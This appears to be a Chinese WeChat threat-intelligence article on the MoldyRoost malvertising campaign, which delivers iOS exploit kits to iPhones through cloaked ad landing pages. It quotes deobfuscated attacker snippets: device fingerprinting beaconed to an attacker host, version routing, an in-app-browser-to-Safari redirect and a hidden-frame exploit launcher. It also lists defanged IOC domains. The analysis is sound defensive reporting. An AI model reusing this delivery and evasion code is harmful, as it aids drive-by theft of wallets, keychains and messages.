---
title: 【微信】一场专挑iPhone下手的恶意广告行动
source: https://mp.weixin.qq.com/s/qD899ZCaRnXXKNXBE_HXfg
source_host: mp.weixin.qq.com
clip_date: 2026-11-24T08:52:39+08:00
trace_id: 00a8c586-92ae-46d2-851a-521128af151c
content_hash: f3496d789eef12bcc7deea714e34102cf483faef676931246c50fe8342f1a345
status: synced
tags:
  - 微信
  - 漏洞分析
  - 恶意样本
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: MoldyRoost借程序化广告与伪装分流，对iPhone发起“只加载落地页即中招”的路过式攻击，投递四套漏洞工具包窃取钱包助记词、钥匙串、消息和照片。
ai_summary_style: key-points
images_status:
  total: 13
  succeeded: 13
  failed_urls: []
notion_page_id: 42275244-d011-8176-8b68-e940f6773a51
ioc:
  cves:
    - CVE-2023-43000
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> MoldyRoost借程序化广告与伪装分流，对iPhone发起“只加载落地页即中招”的路过式攻击，投递四套漏洞工具包窃取钱包助记词、钥匙串、消息和照片。
> 
> - **规模与分工：** 2026年5月至11月，480余个广告域名、六个子集群，覆盖47个以上国家和地区；漏洞工具包并非自研，其强项是广告供应链分发。
> - **触发条件：** 落地页加载即执行漏洞链，无需下载安装包或复制指令；cloaking仅对iPhone Safari放行，其余访客看到白页或诱饵站。
> - **版本分流：** boot.js按iOS 13.0至26分配四套EK：Coruna（13.0–17.2.1）、SilkPath（17.2.2–18.3）、DarkSword（18.4–18.7.2）、GhostWave（18.7.3起）。
> - **窃取范围：** 钱包助记词、keychain、iMessage/WhatsApp/Telegram、照片、Wi-Fi密码与位置历史；DarkSword还能截屏、录音并清理崩溃日志。
> - **源码泄露：** 子集群F“Nano”的.git暴露，证实按销售渠道构建独立payload并按Host归因；该行动与11月16日Optimizely供应链攻击不同，仅共用Coruna与DarkSword。

**黑鸟** *2026年11月21日 23:24*

2026年11月，Confiant披露了一个名为MoldyRoost的大规模malvertising（恶意广告）行动。它投放的payload（载荷）级别不低，属于面向iPhone的国家级漏洞利用链。早在10月，Confiant的ADINT报告就判断有一批广告基础设施正在为间谍软件挑选目标，而MoldyRoost把同一类武器对准了任何一个点进广告的普通人。

这套机器的运转方式并不复杂：攻击者大规模购买programmatic ads（程序化广告），把落地页藏在cloaking（伪装分流）后面，用户每点一次广告，访客的iPhone就会遭遇一次drive-by exploit attempt（路过式漏洞尝试）。背后挂着四套exploit kit（漏洞利用工具包，简称EK），分别叫Coruna、DarkSword、SilkPath和GhostWave，目标是掏出crypto wallet（加密钱包）的seed phrase（助记词）、keychain（钥匙串，即密码管理数据）、消息记录和照片。

最需要普通人记住的一点是，在存在漏洞的iPhone上，仅仅加载广告的落地页就足以完成感染。漏洞链在落地页加载的过程中就开始执行，不需要用户下载任何伪装安装包，也没有ClickFix式的命令要求用户复制粘贴一段指令。统计区间为2026年5月12日至11月17日，Confiant把480余个广告域名归到这一行动下，划分成A到F六个sub-cluster（子集群），覆盖超过47个国家和地区。

需要说明的是，MoldyRoost并没有自己编写这些漏洞利用工具包。链条里的EK来自Coruna和DarkSword两个家族，Google Threat Intelligence Group（GTIG）与iVerify早在2026年3月就记录过这两套iOS工具包。到那时，Coruna已经从一家监控软件厂商的客户手里，流落到一个间谍团伙，再进一步流入犯罪团伙；DarkSword则同时在监控软件厂商的客户和同一支间谍团伙手中流转。

MoldyRoost真正擅长的是分发。广告专门用来通过攻击者控制的供应链投递EK，这条供应链包括投放战役背后的广告账号、被伪装的落地页，以及一个根据访客iOS版本匹配对应EK的router（路由程序）。后端再把每一个被偷走的钱包，记到把受害者引进来的那个channel（渠道）名下。11月中旬，他们的一台服务器把源代码暴露在了外面，代码印证了研究人员此前的判断：其中一次提交为每个销售渠道单独构建一份payload，目的是让后端可以按Host（主机名）归因。这里说的渠道，指的就是运营方自己的单元，即每一个被盗钱包被记账到的战役代码。

## 和11月16日的Optimizely供应链攻击不是一回事

11月16日发生过一起Optimizely供应链攻击：178家机构网站上被劫持的脚本窃取银行卡信息、调换成加密地址，并向iPhone投递漏洞利用。那起攻击的iPhone阶段使用的EK同样是Coruna和DarkSword，背后的版本路由程序也和子集群C、E所用家族同源。

两者的区分点在于，MoldyRoost是一场malvertising行动，受害者通过攻击者自建的广告战役和伪装落地页接触到武器，而不是被入侵网站上的第三方脚本带出来。Confiant明确把MoldyRoost与这起Optimizely攻击分开记录。

## 漏洞链是怎么一步步拿下一台iPhone的

先说清楚一个概念。一条exploit chain（漏洞链）是按顺序串联起来的一串漏洞，作用是把手机从“打开了一个网页”推进到“攻击者控制了设备”。第一个bug让代码在Safari里跑起来，后面几个bug突破浏览器的sandbox（沙箱）隔离，最后一个漏洞接管kernel（内核）。在MoldyRoost自己的文件里，这几个阶段分别叫rce_loader.js、sbx0、sbx1和pe_main.js。访问广告落地页就已经完成全部触发条件，所以这类攻击被称作one-click（一键）或drive-by（路过式）攻击。

一个EK会把一条或多条漏洞链打包，配上识别访客设备并选择合适链条的代码。MoldyRoost按iOS版本在最多四套EK之间做选择。Confiant找到的一份泄露仓库显示，选择器文件boot.js会给iOS 13.0到26之间的每个版本分配四套EK之一，子集群C的框架里跑着同一套版本判断。这个boot.js和Optimizely攻击报告里提到的boot.js并不是同一个文件。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/df58c1cf6e89ac2c.png)

四套EK对应的iOS版本区间：Coruna覆盖13.0至17.2.1，SilkPath覆盖17.2.2至18.3，DarkSword覆盖18.4至18.7.2，GhostWave覆盖18.7.3及之后直至iOS 26

SilkPath的代码注释写着它用来“填补Coruna之后的空档”，分支会加载/SilkPath/delivery/silkpath_loader.js，不过这条路径在泄露仓库里缺失。GhostWave是留给已经修补过DarkSword漏洞的手机的分支，专门寻找系统版本较新的iOS 18 iPhone，它复用DarkSword的loader，由服务器决定阶段，并为iOS 26.3回退到rce_worker_26.3.js，这个文件同样不在泄露仓库里。

多数子集群每一步都有自己的代码，但所有集群切换EK的iOS版本点几乎一致，下图就是它们遵循的分流路径。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/21df7f0410a4fc5b.png)

从广告到漏洞利用工具包的完整流程：程序化广告点击进入落地页，隐藏注入器先判断是否为iPhone Safari，非目标访客得到无害页面，目标访客由漏洞选择器读取版本后分流到四套EK，最终数据汇入运营方后端

## Coruna与DarkSword：主力工具链的来历和偷什么

## Coruna：从监控厂商客户流到犯罪团伙的老工具包

Coruna是较老的家族，包含23个漏洞，分成五条链条，覆盖iOS 13.0到17.2.1。GTIG在2026年3月3日发布分析，iVerify在同一天跟进。GTIG追踪到的路径是：2025年2月时还在某监控软件厂商的客户手中，当年夏天出现在一个疑似俄罗斯间谍团伙针对乌克兰人的攻击活动里；之后，一个financially motivated（受利益驱动）的UNC6691把它用于大范围战役，到2025年底，GTIG在一大批伪造的中文理财网站上都看到了它。GTIG从这条流转路径读出一个信号：二手zero-day exploit（零日漏洞利用）存在活跃交易市场。

在受害者手机上，Coruna的植入物挂钩MetaMask、Phantom、Trust Wallet这类钱包应用，同时在Apple Memos（备忘录）里寻找助记词，在保存的图片里翻找二维码。

## DarkSword：全JavaScript编写，针对iOS 18.4到18.7

DarkSword更新一些，目标区间是iOS 18.4到18.7（iVerify拿到的样本配置停在18.6.2）。它串联六个漏洞，其中三个是zero-day，整套工具完全用JavaScript编写。GTIG从2025年11月就开始观测到它，相关集群的目标包括沙特阿拉伯、一家土耳其监控软件厂商的客户，以及前述同一支俄罗斯团伙。到iOS 26.3，苹果已经把这六个bug全部修好。

DarkSword的数据挖掘器一次带走iMessage、WhatsApp、Telegram数据、keychain、保存的Wi-Fi密码、照片metadata（元数据）、位置历史和钱包数据；其中一个后门还能截屏并录制麦克风。撤离时，DarkSword还会清理自己的崩溃日志。对握着手机的受害者来说，无论中招哪一条链条，损失看起来都差不多：钱包、密码、消息和相册被一并端走。

[23个IOS漏洞打包的Coruna工具包，已完成从国家级到黑产的三级扩散](https://mp.weixin.qq.com/s?__biz=MzAxOTM1MDQ1NA==&mid=2451185590&idx=1&sn=e1ea601b5542c6467ef6a372e9bf0db7&scene=21#wechat_redirect)

[通过攻陷合法网站传播的新型iOS漏洞利用工具包DarkSword](https://mp.weixin.qq.com/s?__biz=MzAxOTM1MDQ1NA==&mid=2451185849&idx=1&sn=90f390064e47068e7f7b5a5c0eef796c&scene=21#wechat_redirect)

## Cloaking：只对iPhone Safari露出獠牙

Cloaking是一种规避技术，它根据user-agent string（用户代理字符串）、IP地理位置、操作系统等条件识别并分流进来的流量。攻击者用它给部分访客喂良性内容，也就是所谓white page（白页），这些访客包括不在目标范围内的普通用户、bot（爬虫）和抓取程序、安全公司、广告技术政策审核人员等；只有真正想打的用户，才会看到money page（钱页），即恶意页面和载荷。广告联盟封禁cloaking行为，因为它带有欺骗性，直接损害用户利益。

MoldyRoost按设备做伪装分流。只有运行Safari的iOS设备（对子集群A、D、E还包括应用内浏览器）才会被送上漏洞链，其余所有人拿到的是一个能用的诱饵网站、一个空框架或者一个无害落地页。

举一个原文记录的典型场景：受害者用iPhone刷香港论坛，点进子集群C一条用粤语写的Agoda广告。页面加载出Agoda香港站点的克隆，同一时刻，一个零像素宽、被推出屏幕外的不可见框架打开了一个用户看不见的主机。这个框架读取本机iOS版本，向服务器询问该触发哪套EK，然后开始执行。用户一旦点到什么东西，一条18秒的“加载中”进度条会把点击拖住，再跳转到真正的Agoda，这段时间正好给框架留出执行窗口。

对iPhone以外的设备，这个框架看起来是死的；子集群A的框架做得更彻底，对其他所有访客直接返回空页面。只有请求长得像iPhone Safari时，真正的代码才会下发，研究人员也是以这种方式主动请求到的恶意代码。

## 六个子集群：同一批武器，六套门面

Confiant把MoldyRoost跟踪为六个子集群，每个集群有自己的广告战役和投递代码，但六个集群调用的是同一批漏洞。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/7fe9b21bd4525a26.png)

六个子集群总览：主题方向、首次出现时间、广告域名数量、漏洞注入方式与使用的EK一览

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/67b05a745dd914ff.png)

各子集群每日与每月投放量柱状图，子集群A从5月持续到11月且量级最大，B、C、D、E、F在9月之后陆续出现

## 子集群A：最老、域名最多的杂志门面

A是最老的子集群，广告域名也最多。403个广告域名首次出现于5月12日至11月17日之间，覆盖35个国家和地区。头部目标为香港197个、日本40个、新加坡22个、英国14个，土耳其与韩国各13个。这类杂志风格的域名从5月起就被研究人员看到。Validin在3月就于GTIG报告记录的一条Coruna投递URL上，发现过同一个dropper（投放器）：带屏外iframe的51la-ll.js LaSDK loader。原文记录的两个样本分别是11月4日抓取的r8q3k\[.\]com和11月3日抓取的k16mq\[.\]com。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e31ad1aad0c5eee6.png)

子集群A的样本：左侧日文医疗类广告卡片，右上为对应的日文杂志落地页，右下为旅行主题杂志页面

11月，A改变了漏洞加载方式。11月4日起，部分新域名沿用旧结构，但带上了一个新的脚本标签，位置就是旧战役原先加载dropper的地方：

< async defer src="https://iyegjb\[.\]cc/assets/js/m.js">

在iPhone上，m.js向group.html打开一个隐藏框架，这个文件名出现在GTIG归给UNC6691的多数Coruna投递URL上；第二个脚本负责给手机做指纹识别。两者配合起来给每台手机画像，跑掉的还会重试。这段代码是从压缩混淆源码整理并改写后的版本，它只对iOS设备做指纹识别，第二个脚本a8c3f01e6b47d295.js在其他设备上什么都不做。在iPhone、iPad或iPod上，它会根据user agent、iOS版本、机型和build number（构建号）生成设备ID，存为hq_devid，记录页面是在哪个应用里打开的，页面加载完成后立刻把全部信息发到/hx：

if (!/iP(hone|ad|od)/.test(qA)) return;

var qP = qK(\[42, 58\], 66);// XOR 66 = "hx"

var qM = qK(\[18, 13, 17, 22\], 66);// XOR 66 = "POST"

var qU = "https://iyegjb\[.\]cc/" + qP;

var qB = JSON.stringify({ k:1, n:qN, v:qV, s:qS, r:qR, d:qId, b:qBr, m:qIdt.m, bv:qIdt.bv });

navigator.sendBeacon(qU, new Blob(\[qB\], { type: "text/plain" }));

打开框架之前，loader会先判明两件事。一是iOS版本：它在user agent的四处位置做检查，包括Facebook应用内的FBSV字符串，取其中最高版本号，这样在iOS 26上也能拿到真实版本，因为那里Safari的user agent被冻结在18_6。二是机型：从屏幕尺寸和像素比例读取。两者以vm=和panel=参数带进框架URL，服务器在下发任何内容前就大致知道面对的是哪台手机。iOS 16.0有单独分支：等待页面加载完成后，再多等1.5秒。机型判断的典型片段如下：

if (Math.abs(d - 2) < 0.05 && a === 414 && b === 896) return "xr";// iPhone XR, 11

if (Math.abs(d - 2) < 0.05 && a === 375 && b === 667) return "se";// iPhone 6 to 8, SE

if (Math.abs(d - 3) < 0.05 && a === 375 && b === 812) return "iphone11"; // X, XS, 11 Pro, 12/13 mini

if (p) q += "panel=" + encodeURIComponent(p);

if (v) q += (q? "&": "") + "vm=" + v\[0\] + "." + v\[1\];

它还会把应用内浏览器赶到Safari。设想用户在Instagram、Facebook、Messenger、Line里，或者在iPhone上的Chrome、Firefox、Edge、Opera里点了广告。loader监听隐藏框架，框架通过\__hq_chain消息回报start、ok或crash。出现两种情况时它判定这个浏览器不可用：链条崩溃后8秒内没有收到ok，或者链条启动后75秒内没有收到ok。随后它通过x-safari-https://链接在Safari里重新打开同一页面，带上\_sf=1参数让框架重新开始（?force=1）。如果应用阻止了跳转，隐藏框架就转为全屏，展示自己的卡片。子集群B要求访客手动把链接复制到Safari，A的loader则自己完成跳转：

if (d.type!== "\__hq_chain") return; if (d.st === "ok") { ok = true; stop(); return } if (d.st === "start") { started = true; startAt = Date.now() } else if (d.st === "crash") { crashAt = Date.now() } if (crashAt && now - crashAt >= 8000) dead = true; if (started && now - startAt >= 75000) dead = true; var scheme = "x-safari-" + backUrl.replace(/^https?:\\/\\//i, "https://");

## 子集群B：用Safari引导卡和小游戏分流

B混合了不同类型的落地页。31个广告域名首次出现于10月4日至11月17日，覆盖20个国家和地区，头部为美国5个、印度3个，加拿大、法国、意大利、日本、越南各2个。多数页面会向非Safari访客展示一张深蓝色卡片，写着“Please open with Safari”，因为B的链条只能在Safari里跑，在应用内置浏览器里点广告的受害者必须先被引导过去。

其余页面是加载chain.js SDK的小游戏；加密安全类页面从另一个SDK主机做同样的事。chain.js SDK会把每个访客上报给服务器，但只有能从user agent读出iOS或Safari版本时，才会加载链条框架。两个样本分别是10月25日打开深蓝Safari引导页的veloris\[.\]cyou，以及10月19日落地到“Neon Snake”游戏的“Mini-games”广告tldye\[.\]vip。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ce2d3a5446c2286f.png)

子集群B的样本：手表广告卡片、深蓝底“Please open with Safari”引导页、Mini-games广告卡片与Neon Snake游戏页面

## 子集群C：克隆香港大牌站点

C以克隆大品牌网站的战役针对香港。31个广告域名首次出现于10月20日至11月17日，覆盖6个国家和地区：香港25个、美国2个，德国、印度、澳门、泰国各1个。多数克隆站是真实站点的保存副本，其中几个用浏览器扩展WebScrapBook制作，挂在新注册域名上。它们大多从hg0-q-nuu0fy8vm5a\[.\]lol加载同一个框架，框架配置指向命令服务器，路由分别对应keychain与沙箱数据、命令结果和心跳。另有三个框架主机为C的其余七场战役提供服务，列在IOC清单里，其中两个的框架未被扫描捕获。从11月15日起，kintoklart\[.\]com、openrices\[.\]click、discus\[.\]cyou三个新克隆站在第五个主机zhcnn\[.\]com上挂了一个路由，该路由使用与子集群E相同的C10路径。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c782fb29c2950e1a.png)

子集群C样本：粤语撰写的“Agoda订房特惠”广告，以及落地的克隆Agoda香港页面agodahk\[.\]top，11月3日抓取

## 子集群D：假人机验证，但不是ClickFix

D使用一张伪造的captcha（验证码）页面。5个广告域名首次出现于10月28日至11月8日，分布在印度、以色列、科威特、美国各1个，另有1个未记录国家。它复用C的落地页脚本，但框架不同。10月下旬起，hhtagg\[.\]cn在香港以外投放战役，展示伪造的Cloudflare“Verify you are human”检查，这个检查唯一的作用是把访客留住，等待漏洞加载。它看起来像ClickFix，但并不是ClickFix。lazaruscollections\[.\]cn是例外：同样展示假验证码，但跑一个内联路由，把iOS 18及以上设备送到/go/{ch}，做法接近子集群E。

D并不要求访客复制、粘贴或运行任何东西。Coruna和DarkSword的投递完全静默，来自页面一打开就加载的隐藏hhtagg\[.\]cn框架，假检查只是把人留在页面上配合执行。这些落地页用与C完全相同的脚本加载框架，框架保留C的设备cookie和服务器API，但内部代码不同：一套链条给Safari，另一套给Facebook、Instagram这类应用内浏览器。其中一处注释点出了\_x_done，也就是A框架里的成功锁。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c4c7f0b791cdaa54.png)

子集群D样本：奢侈品收藏广告、机器人公司广告，以及伪造Cloudflare人机验证的落地页

## 子集群E：TRX能量、挖矿与新闻调查主题

E的战役围绕TRX energy（波场能量）、加密挖矿或新闻调查展开。10个广告域名首次出现于9月15日至11月16日，澳大利亚、奥地利、印度、墨西哥、新西兰、尼日利亚、韩国、乌干达各1个，美国2个。最早发现的81by\[.\]top是一个揭露诈骗园区的站点，加载的路由把较老的iPhone送到与C相同的Coruna入口文件；第二场matchsphere\[.\]icu是伪造的反诈骗站点，11月16日加载同一路由；第三场ycka\[.\]my从11月2日起出现，是TRX主题战役，路由内联跑在自己的域名上。

更早的战役主题是TRX租赁和比特币矿工，多数从jiaoyang677\[.\]sbs自己的子域加载嵌入脚本/lj/e.js，脚本的中文头部自称员工嵌入脚本。在iPhone上，它在两像素宽的框架里打开引导页，反复重载，直到内核阶段回报成功。这条成功消息叫\__labPeOk，其中“lab”命名与ycka\[.\]my源码注释里的后端一致。另外三场ezdata88\[.\]com、poodoobb\[.\]com、baidubot\[.\]com共享一个混淆脚本/index.js或/CAI6666/index.js，把渠道代码BIGNIAO、设备版本和页面域名POST到随机.icu主机上的/api/iptj。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d73672af07c7b207.png)

子集群E样本：中文“东南亚黑色产业·重大新闻观察”广告卡片，以及深色新闻调查风格的落地页81by\[.\]top

## 子集群F：代号Nano，泄露了源码的那个集群

F代号“Nano”，正是泄露源代码的子集群。2个广告域名分别首次出现于11月3日和11月12日，分布在印度和美国各1个。这一集群从服务器ab124\[.\]live泄露，源码暴露在外。第一场战役vuzarela\[.\]sbs运行着攻击者Nano所复制厂商的注入器；第二场blockstermediacoin\[.\]live从gq26uzx2.ab124\[.\]live加载payload。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b2170d55eebdcf0f.png)

子集群F样本：“Global Digital Assets Pulse”加密资讯广告，以及BMC行情落地页blockstermediacoin\[.\]live

## 源码泄露：Nano仓库里到底写了什么

11月12日，ab124\[.\]live把自己的.git目录留在了可读状态。目录列表虽被关闭，但单个对象仍可按路径取回，研究人员据此恢复出部分仓库，包括10月27日至11月4日之间的提交。所有提交的作者署名都是nano，时区UTC+8，远端指向一台私有Gitea服务器http://67.215.227\[.\]138:3000/nano/ios_script.git，研究人员没有对这台服务器做进一步操作。

README解释了ios_script是什么：Nano对别人链条的重建。它把iOS 16一侧称为某链条的“vendor form（厂商版本）”，该链条从i0s\[.\]top和i0s\[.\]io逆向而来，现在由Nano自己的后端提供，缺少任何模块时再按需向i0s\[.\]io拉取。这些片段与GTIG的Coruna分析对得上：第一阶段代号terrorbird，针对iOS 16.2至16.5.x，正是GTIG列出的16.2至16.5.1 Coruna漏洞CVE-2023-43000。EK的钱包目标里，除一个之外全部在GTIG的Coruna钱包清单上，唯一例外是OKX，Nano在11月3日补上了它的新bundle ID（应用包标识）。

仓库另一半按DarkSword的文件布局装着iOS 18链条，包括rce_loader.js、按版本划分的worker、sbx0和sbx1两个沙箱阶段、pe_main.js，还放着boot.js选择器，子集群C的框架在另一个构建里运行同一套版本检查。Nano服务器上的路由表说明，被感染手机里的哪些数据会被带走：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/14f27204db4fe641.png)

Nano服务器各路由回收的数据：设备画像与钱包地址余额、AES加密的钱包助记词、钱包文件与keychain及沙箱数据、联系人、备忘录、已安装应用、照片、SMS短信

读起来像一套已经投产产品的发布说明。有一次提交强制上报keychain，原因是“HQ side”在过滤报告，会悄悄把它丢掉。另一次提交在应用更新后给钱包进程改名：Bitget Wallet现在跑作Runner，Tonkeeper跑作Keeper。11月4日的提交给每个销售渠道独立子域和独立payload，这样偷来的数据到达时已经贴上了赚取它的渠道标签。

## 连iOS 26的指纹细节都被算计进去了

攻击者清楚iOS 26的一个怪异之处：那里Safari把user agent里的系统版本冻结在18_6，真实版本号挪到了Version/26.x。子集群B的SDK头部在10月10日修订，恰好提醒了这一点，并说明与链条loader里的“26-GATE”对齐。子集群E的路由把iOS 19及以上设备送到单独路径C10，注释称内部代码倾向于26。The Hacker News曾报道同一生态里出现过iOS 26分析工作区。这里需要保留表述余地，研究人员尚未见到iOS 26的漏洞代码，无法判断这些分支是否真的可用。

研究人员用iPhone Safari、iOS 18.6的user agent向子集群A的框架发请求，第一次返回一个版本路由程序：

var isDN = mj > 17 || (mj == 17 && (mn > 2 || (mn == 2 && pt > 1)));

var target = isDN? 'dn_j5k598x5fddj7t42.html': 'txocbnuz348cegoovxwg.html';

if (sessionStorage.getItem('rce_locked')) return;

iOS 17.2.1及以前走一条路，更新的系统进入dn\_框架，第二次请求取到该框架。框架再做一次分流（摘录并整理）：

if (major > 0 && major < 18) {// Coruna side

s.src = "49554fde7424c31c.js?v=" + Math.random();

return;

}

if (localStorage.getItem("\_x_done")) return;

// Multi-frame exploit launcher (from ds-mini)

var MAX_FRAMES = 5, FRAME_DELAY = 35000;

f.src = 'frame.html?' + idx + '\_' + Date.now() + '\_' + Math.random();

iOS 18以下加载49554fde7424c31c.js，即i0s厂商Coruna链条的主调度器，也是F从ab124\[.\]live提供的同一个文件。从iOS 18起（含iOS 26），它依次打开隐藏的frame.html框架，启动器在注释里归于“ds-mini”。localStorage里的\_x_done标记确保已经完成的手机不会被打第二次。两个页面最后编辑时间都在11月13日，相隔只有几秒。

详细IOC可见blog.confiant.com/p/moldyroost-a-malvertising-machine

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5e6aabc16f3a03fa.jpg)

更多内容：

## 六个子集群背后是不是同一个团伙

Confiant的判断是，MoldyRoost属于同一个运营：六个子集群背后是同一条供应链和同一个交付平台。当然，同一工具包的不同客户之间也会共享下面列出的部分关联，但目前还无法断定究竟是单一行动者团队运营全部子集群，还是所有者把各个子集群出租给affiliate（加盟方）。

转售式设计让加盟模式仍有讨论空间。每个渠道都带自己的代码，C的框架有一处注释写着“渠道统计”，Nano按渠道构建payload，Censys还在一台相关DarkSword C2（命令控制服务器）上发现了代理与分销商管理面板，The Hacker News对此有过报道。广告账号本身不能证明任何归属：它们都是经过验证的企业账号，大概率是买来或劫持来的，一个运营者可以同时操纵几十个。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/02cc671597a22875.png)

六个子集群之间的技术关联线索

威胁情报 · 目录
